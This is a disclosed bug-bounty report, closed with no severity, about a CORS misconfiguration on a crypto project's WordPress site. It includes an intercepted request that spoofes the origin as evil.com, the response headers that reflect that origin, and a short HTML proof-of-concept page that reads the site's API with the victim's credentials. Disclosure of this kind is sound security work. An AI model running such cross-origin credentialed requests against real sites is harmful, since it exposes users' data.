# Cross Origin Resource Sharing Misconfiguration | Lead to sensitive information.

## Report Details
- **Report ID**: 1189363
- **URL**: https://hackerone.com/reports/1189363
- **State**: Closed
- **Severity**: none
- **Submitted**: 2021-05-09T09:45:04.152Z
- **Disclosed**: 2021-05-13T03:32:40.744Z

## Reporter
- **Username**: sudhakarsurya
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: sifchain

## Vulnerability Information
hii team,
 i found a cors bug in your https://sifchain.finance/  website  .

 Steps To Reproduce:
#  1. goto  https://sifchain.finance/     website  and enter email and  click signup.
# 2. intercept via burp ,you  will get a request .  send to repeater.
# 3.change the request as 

 POST /==wp-json== HTTP/2
Host: sifchain.finance
Cookie: __cfduid=d4eb7f6f55c752d2db3148265a583b3381620281228; amplitude_id_fef1e872c952688acd962d30aa545b9esifchain.finance=eyJkZXZpY2VJZCI6ImUyMzY5ZDM2LTFlZGItNDY4ZS1iZGY1LTlkYmIzZTc0YjY3YVIiLCJ1c2VySWQiOm51bGwsIm9wdE91dCI6ZmFsc2UsInNlc3Npb25JZCI6MTYyMDM1OTc3NDA5OSwibGFzdEV2ZW50VGltZSI6MTYyMDM1OTc3NTQ1NiwiZXZlbnRJZCI6MSwiaWRlbnRpZnlJZCI6MSwic2VxdWVuY2VOdW1iZXIiOjJ9; _ga=GA1.2.1872300780.1620359778
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 129
Origin: https://evil.com
Referer: https://sifchain.finance/
Upgrade-Insecure-Requests: 1
Te: trailers
Connection: close

EMAIL=loyixac322%40ffuqzt.com&_mc4wp_honeypot=&_mc4wp_timestamp=1620546910&_mc4wp_form_id=204&_mc4wp_form_element_id=mc4wp-form-1
## Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]


#4.the response is,

HTTP/2 404 Not Found
Date: Sun, 09 May 2021 08:09:06 GMT
Content-Type: application/json; charset=UTF-8
Strict-Transport-Security: max-age=15552000; includeSubDomains
Vary: Accept-Encoding
X-Hacker: If you're reading this, you should visit automattic.com/jobs and apply to join the fun, mention this header.
Host-Header: WordPress.com
X-Robots-Tag: noindex
Link: <https://sifchain.finance/wp-json/>; rel="https://api.w.org/"
X-Content-Type-Options: nosniff
Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link
Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
Access-Control-Allow-Origin: ==https://evil.com==
Access-Control-Allow-Methods: ==OPTIONS, GET, POST, PUT, PATCH, DELETE==
Access-Control-Allow-Credentials: ==true==
Vary: Origin
X-Ac: 3.bom _atomic_dca
Cf-Cache-Status: DYNAMIC
Cf-Request-Id: 09f1c54e890000e2b5f2b9d000000001
Expect-Ct: max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"
Server: cloudflare
Cf-Ray: 64c97190df83e2b5-NAG

{"code":"rest_no_route","message":"No route was found matching the URL and request method.","data":{"status":404}}

   
#5.In response headers you can see headers:
  
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Methods: OPTIONS, GET, POST, PUT, PATCH, DELETE
Access-Control-Allow-Credentials: true

#6.So you can write exploit:

<!DOCTYPE html>
<html>
   <head>
      <script>
         function cors() {
            var xhttp = new XMLHttpRequest();
                xhttp.onreadystatechange = function() {
                    if (this.readyState == 4 && this.status == 200) {
                        document.getElementById("emo").innerHTML = alert(this.responseText);
            }
         };
         xhttp.open("GET", "https://sifchain.finance/wp-json", true);
         xhttp.withCredentials = true;
         xhttp.send();
         }
      </script>
   </head>
   <body>
      <center>
      <h2>CORS PoC Exploit </h2>
      
      <div id="demo">
         <button type="button" onclick="cors()">Exploit</button>
      </div>
   </body>
</html>

## Impact

Attacker would treat many victims to visit attacker's website, if victim is signup, then his personal information is recorded in attacker's server.

attchments:

## Attachments
- request.jpg
- changed__req.jpg
- bandicam_2021-05-09_09-06-39-753.jpg
